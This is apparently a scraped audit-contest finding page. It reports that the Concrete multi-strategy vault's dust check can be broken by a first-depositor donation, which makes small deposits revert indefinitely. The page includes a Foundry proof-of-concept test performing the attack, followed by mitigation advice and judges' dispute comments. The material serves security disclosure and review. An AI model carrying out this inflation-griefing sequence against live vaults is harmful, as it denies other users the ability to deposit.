@@ -1,0 +1,157 @@
+News
+
+Leaderboard
+
+Submissions
+
+Explore C4
+
+Audits
+
+Bounties
+
+Reports
+
+Support
+
+Resources
+
+Docs
+
+Terms
+
+Privacy
+
+saraswati
+Submissions
+Concrete
+/
+F-122
+Medium
+Primary
+S-362
+Vault deposit dust check can be exploited with inflation attack to break small deposits indefinitely
+muellerberndt
+00
+Sufficient
+383d ago
+Finding description and impact
+
+The vault deposit function verifies that each deposit creates at least 1e8 shares. This prevents attackers from abusing inflation attacks to steal funds from users. However, the first depositor can manipulate the conversion rate such that small deposits will always fail, creating a griefing attack vector.
+
+Proof of Concept
+
+The following test demonstrates the issue. Here, the first depositor first deposits 1 token followed by a donation of 10 tokens (10 * 1e18). From then on (during the lifetime of the vault) smaller deposits such as 0.5 tokens (0.5 * 1e18) will no longer be possible as the issued amount of shares would fall below the dust limit.
+
+uint32 private constant DUST = 1e8;
+
+function test_inflationAttack() public {
+
+        (ConcreteMultiStrategyVault newVault, Strategy[] memory strats) = _createNewVault(false, false, false);
+
+        uint256 mintAmount = 1000 ether;
+        uint256 depositAmount = 10 ether;
+
+        asset.mint(hazel, mintAmount);
+
+        vm.startPrank(hazel);
+        asset.approve(address(newVault), mintAmount);
+        uint256 hazelShares = newVault.deposit(1, hazel);
+        vm.stopPrank();
+
+        uint256 assets = newVault.previewDeposit(depositAmount);
+
+        console.log("Shares for 10 ether deposit", assets);
+        console.log("Attacker balance", newVault.balanceOf(hazel));
+        console.log("TotalSupply", newVault.totalSupply());
+        console.log("Vault asset balance", asset.balanceOf(address(newVault)));
+
+        vm.prank(hazel);
+        asset.transfer(address(newVault), depositAmount);
+
+        assets = newVault.previewDeposit(0.5 ether);
+        console.log("Shares for 0.5 token after attack", assets);
+
+        assertLt(assets, DUST);
+
+        vm.expectRevert();
+
+        vm.prank(hazel);
+        newVault.deposit(0.5 ether, hazel);
+    }
+
+
+Recommended mitigation steps
+
+Instead of doing the dust check, use a proven method of preventing inflation attacks such as creating dead shares upon the first deposit (see also this OpenZeppelin article).
+
+Links to affected code
+ConcreteMultiStrategyVault.sol#L227-L243
+Opens in a new window
+Submissions touching same files
+ConcreteMultiStrategyVault.sol
+View full submission
+Comments for the judge
+2
+You are viewing comments for the primary submission, S-362.
+0xnev-validator-comment-S-362
+Edited: Feb 22
+0xnev
+
+This looks to be a tradeoff when implementing an inflation attack prevention. Since all shares are scaled up by 1e9 as decimal offset,
+
+Picodes
+01/07/2025
+
+yes but what is the purpose of the dust check? If it creates an issue when combined with inflation attack prevention
+
+Dispute Logic
+Edited: Feb 22
+rdturner
+
+We properly implement OpenZeppelin's decimal offset protection
+The decimal offset of 9 makes inflation attacks non-profitable
+The test case provided doesn't account for our decimal offset implementation
+Small deposits will still generate sufficient shares above the DUST threshold
+The protection is well-tested in OpenZeppelin's test suite
+
+Picodes
+Edited: 12/28/2024
+
+It seems actually valid to me:
+
+The decimal offset creates a starting point of 1 asset = 1e9 shares
+
+After a first donation: 10e18 assets for 1e9 shares
+
+Now 1e8 shares is 1e18 assets so DUST is broken
+
+Duplicates
+2
+S-718
+deposit/withdraw may not work as expected if the funds is small.
+0x37
+00
+S-693
+Whales can prevent users withdrawing assets and redeeming shares
+montecristo
+00
+Timeline
+Submitted
+Created: 545d ago
+Medium
+Triage
+Medium
+Valid
+Primary
+Sufficient
+Review
+Disputed
+Judging
+Valid
+Primary
+Sufficient
+Post-judging QA
+Complete
+Reporting
+Complete
